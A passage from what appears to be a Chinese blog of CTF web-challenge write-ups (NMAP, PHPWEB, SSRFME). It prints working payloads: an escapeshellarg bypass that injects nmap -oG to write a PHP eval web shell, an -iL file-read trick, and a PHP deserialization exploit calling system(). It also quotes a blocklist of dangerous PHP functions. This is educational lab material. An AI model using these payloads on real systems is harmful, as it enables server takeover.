+<p><img src="https://img-blog.csdnimg.cn/ea025726ab7b4d11aca95c2a4de1edc2.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>随后用shell参数反弹shell就行了。</p>
+<h1 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h1><p>参考文章：<a target="_blank" rel="noopener" href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/">http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a></p>
+<p><strong>escapeshellcmd</strong> — shell 元字符转义</p>
+<p>功能：<code>escapeshellcmd()</code>对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 <a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.exec.php">exec()</a> 或 <a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.system.php">system()</a> 函数，或者 <a target="_blank" rel="noopener" href="http://php.net/manual/zh/language.operators.execution.php">执行操作符</a> 之前进行转义。</p>
+<p>反斜线（\）会在以下字符之前插入： <code>&amp;#;|\*?~&lt;&gt;^()[]&#123;&#125;$, \x0A和 \xFF</code>。 *’* 和 <em>“</em> 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 <em>%</em> 和 <em>!</em> 字符都会被空格代替。</p>
+<p><strong>定义</strong> ：<code>string escapeshellcmd ( string $command)</code></p>
+<p><strong>escapeshellarg</strong> — 把字符串转码为可以在 shell 命令里使用的参数</p>
+<p><strong>功能</strong> ：<code>escapeshellarg()</code> 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号)</p>
+<p><strong>定义</strong> ：<code>string escapeshellarg ( string $arg )</code></p>
+<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>考察命令执行，和<code>escapeshellarg</code>的绕过</p>
+<p>打开界面，发现是nmap，试一下127.0.0.1正常输出扫描结果，这肯定是命令执行，试一下<code>127.0.0.1| ls</code>,发现转义了|。</p>
+<p><img src="https://img-blog.csdnimg.cn/0f98865e7a5849d8b9ae690eadcf69bf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>参考上面的文章绕过转义，这里有很多payload，注意php也被过滤了</p>
+<p><code>&#39; &lt;?= @eval($_POST[&#39;cmd&#39;];)&gt; -oG pd.phtml &#39;</code></p>
+<p><code>127.0.0.1&#39; -iL ../../../../flag -o 1</code></p>
+<p>在线测试了一下，没问题</p>
+<p><img src="https://img-blog.csdnimg.cn/56869b7313ac41da871dcdf5a862d9ab.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>可以看一下源码</p>
+<p><img src="https://img-blog.csdnimg.cn/6f87e72fdd024af786d6e90606fd4eb7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>读flag</p>
+<p><img src="https://img-blog.csdnimg.cn/8a52b789d1d74244ae930f7970c68d30.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述">****</p>
+<h1 id="PHPWEB"><a href="#PHPWEB" class="headerlink" title="PHPWEB"></a>PHPWEB</h1><p>抓包发现有两个参数func和p,又提示有func最开始为date函数，猜测这里可以执行函数命令，试了一下system等发现被过滤，最后尝试了半天试了下<code>func=readfile&amp;p=./index.php</code>，读到了源码。</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span>);<br> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span></span>) </span>&#123;<br>     <span class="hljs-variable">$result</span> = call_user_func(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>     <span class="hljs-variable">$a</span>= gettype(<span class="hljs-variable">$result</span>);<br>     <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>         <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>     &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;&#125;<br> &#125;<br> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>     <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<br>     <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>         <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>             <span class="hljs-keyword">echo</span> gettime(<span class="hljs-keyword">$this</span>-&gt;func, <span class="hljs-keyword">$this</span>-&gt;p);<br>         &#125;<br>     &#125;<br> &#125;<br> <span class="hljs-variable">$func</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;func&quot;</span>];<br> <span class="hljs-variable">$p</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;p&quot;</span>];<br><br> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> != <span class="hljs-literal">null</span>) &#123;<br>     <span class="hljs-variable">$func</span> = strtolower(<span class="hljs-variable">$func</span>);<br>     <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$disable_fun</span>)) &#123;<br>         <span class="hljs-keyword">echo</span> gettime(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>     &#125;<span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);<br>     &#125;<br> &#125;<br> <span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure>
+
+<p>审计一下发现考的还是反序列化，直接exp：</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>	<span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span>;<br>	<span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span>;<br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span></span>) </span>&#123;<br>		<span class="hljs-comment"># code...</span><br>		<span class="hljs-keyword">$this</span>-&gt;p = <span class="hljs-variable">$p</span>;<br>		<span class="hljs-keyword">$this</span>-&gt;func = <span class="hljs-variable">$func</span>;<br>	&#125;<br>&#125;<br><span class="hljs-variable">$demo</span> = <span class="hljs-keyword">new</span> Test(<span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;ls /&quot;</span>);<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$demo</span>);<br><br></code></pre></div></td></tr></table></figure>
+
+<p>最后尝试了flag在<code>/tmp/flagoefiu4r93</code></p>
+<p><img src="https://img-blog.csdnimg.cn/c6551e040d3847e9b4a28b7527292673.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h1 id="SSRFME"><a href="#SSRFME" class="headerlink" title="SSRFME"></a>SSRFME</h1><p>参考文章<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/147371417">https://zhuanlan.zhihu.com/p/147371417</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/gqtcgq/article/details/50273431">https://blog.csdn.net/gqtcgq/article/details/50273431</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5665#toc-0">https://xz.aliyun.com/t/5665#toc-0</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/ctf/">ctf</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/web/">web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/08/30/2021-8-30-%E7%A5%A5%E4%BA%91%E6%9D%AF/">
+                        <span class="hidden-mobile">祥云杯</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/clipboard.min.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
